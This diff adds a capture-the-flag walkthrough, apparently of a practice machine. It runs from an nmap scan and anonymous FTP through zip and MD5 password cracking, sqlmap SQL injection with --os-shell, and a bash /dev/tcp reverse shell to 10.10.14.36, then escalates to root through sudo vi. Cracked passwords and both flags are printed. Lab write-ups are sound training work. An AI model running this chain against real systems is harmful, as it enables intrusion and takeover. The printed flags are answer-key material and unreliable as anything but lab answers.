@@ -1,0 +1,83 @@
+We start with nmap scan: nmap -sC -sV -p- --min-rate 5000 (target ip)
+
+We see three ports are open, 21 which is ftp, 22 which is ssh, and 80 which is http.
+
+We can see that we can login to the ftp server as anonymous: ftp (target ip).
+
+After logging in, we can see a zip file called backup, so we download it: get backup.zip .
+
+We will try to unzip the zip file: unzip backup.zip, however, the zip file needs a password.
+
+We will use John the Ripper tool to crack the zip file.
+
+We will first need to convert the zip file to hash using zip2john module that John the Ripper has: zip2john backup.zip>hashes.
+
+This will create a file that is called hashes that has the hash of the zip file.
+
+Now, we will use the rockyou.txt file to crack the password: john -wordlist=/usr/share/wordlists/rockyou.txt hashes
+
+The password is : 741852963.
+
+Now we unzip the backup file and we see a php file. We will open and see what it contains. 
+
+We will find the username and the hash for the password for the login page on the http server. 
+
+We can use this website to crack that md5 hash:https://md5.gromweb.com .
+
+The passsword is qwerty789.
+
+We will login using these credentials.
+
+
+We will use sqlmap for this website. We need to install cookie editor on our chrome search engine to get the cookie PHPSEED.
+
+We will use sqlmap like so: sqlmap -u 'http://(targetip)/dashboard.php?search=any+query' --
+cookie="PHPSESSID=(cookie seed)"
+
+The sqlmap tool will notify us that the search input that the page has is vulnerable. This all what we needed.
+
+We will run the sqlmap command again with adding --os-shell at the end of the command as this will give us a reverse shell.
+
+However, this shell is not very functional, to make it more functional will run this command:bash -c "bash -i >& /dev/tcp/10.10.14.36/1234 0>&1". But first we need to run netcat listener on the port that we speciefied.
+
+Now, we have a shell using netcat.
+
+We can find the user flag in : /var/lib/postgresql/user.txt
+user flag: ec9b13ca4d6229cd5cc1e09980965bf7
+
+---------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------
+
+Privilege Escalation:
+
+Since we know that this linux machine is hosting a website, so we search for a directory called www: find / -type d -name "www" 2>/dev/null .
+
+We indeed find a directory called www. We go deeper and we see a file called dashboard.php. This is where we can find the password for this current user:P@s5w0rd!.
+
+We can lose the shell at anytime, so instead, we can login using ssh: ssh postgresql@(target ip), and we use the password that we just found.
+
+We will do: sudo -l. This will show us that we have privilege to run pg_hba.conf file using vi. 
+
+We will go to:https://gtfobins.github.io/gtfobins/vi/#sudo to see how we can use this to gain privilege.
+
+According to this website, we can run the following command: sudo vi -c ':!/bin/sh' /dev/null, so we will replace the vi with /bin/vi /etc/postgresql/11/main/pg_hba.conf.
+
+Unfortunatilly, this didnt work.
+
+We can change that file using vi to give us privilege. First, we launch the file : sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf . 
+
+We will type the following: :set shell=bin/sh . Then, we press enter and type :q to quit.
+
+Then, we open the file again and type the following: :shell . Then we quit.
+
+After we quit, we will notice that we are root.
+
+We can find the root flag under : /root/root.txt
+
+root flag: dd6e058e814260bc70e9bbdef2715849
+
+//END
+
+
+
